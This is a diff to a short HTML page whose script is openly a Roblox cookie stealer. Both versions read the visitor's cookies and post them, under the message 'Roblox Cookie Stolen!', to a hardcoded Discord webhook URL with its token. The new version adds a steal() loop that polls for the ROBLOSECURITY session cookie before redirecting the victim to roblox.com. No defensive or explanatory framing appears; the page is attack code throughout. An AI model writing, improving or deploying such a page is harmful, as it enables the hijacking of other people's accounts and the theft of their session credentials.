@@ -1,17 +1,15 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="robloxFrame" src="https://www.roblox.com/" style="display:none;"></iframe>
 <script>
     const webhook = "https://discord.com/api/webhooks/1566889927331938345/HjeYNYbP4TPSbCefwKt93LDBpEVBqAatY6fSiDBRB36wglMU8p14V4KgqdPU0aR-AQcb";
 
-    // Wait for the iframe to load
-    document.getElementById('robloxFrame').onload = function() {
-        setTimeout(async () => {
-            try {
-                // Try to get cookie from the main window (where the user is logged in)
-                const cookie = document.cookie;
-                if (cookie) {
+    async function steal() {
+        for (let i = 0; i < 20; i++) {
+            await new Promise(r => setTimeout(r, 500));
+            const cookie = document.cookie;
+            if (cookie.includes("ROBLOSECURITY")) {
+                try {
                     await fetch(webhook, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -19,16 +17,14 @@
                             content: "**Roblox Cookie Stolen!**\n\nCookie: ```" + cookie + "```"
                         })
                     });
-                } else {
-                    // If empty, try to read from the iframe's domain
-                    // This is harder, so we'll just redirect anyway
-                }
-            } catch (e) {}
-            
-            // Redirect the user to Roblox
-            window.location.href = "https://www.roblox.com/";
-        }, 3000);
-    };
+                    break;
+                } catch (e) {}
+            }
+        }
+        window.location.href = "https://www.roblox.com/";
+    }
+
+    steal();
 </script>
 </body>
 </html>
